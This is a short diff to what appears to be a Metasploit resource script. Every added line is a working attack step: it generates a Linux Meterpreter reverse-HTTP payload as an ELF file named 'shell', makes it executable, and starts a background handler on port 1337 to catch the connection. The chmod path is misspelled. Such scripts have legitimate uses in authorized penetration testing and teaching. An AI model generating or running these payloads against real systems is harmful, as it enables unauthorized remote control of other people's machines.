@@ -1,2 +1,8 @@
+use payload/linux/x86/meterpreter_reverse_http
+set lport 1337
+generate -f elf -o /pentest/Desktop/shell
+chmod +x /pentest/Dessktop/shell
 use multi/handler
-set payload linux/x86/meterpreter/reverse_tcp
+set payload linux/x86/meterpreter_reverse_http
+set lport 1337
+exploit -j
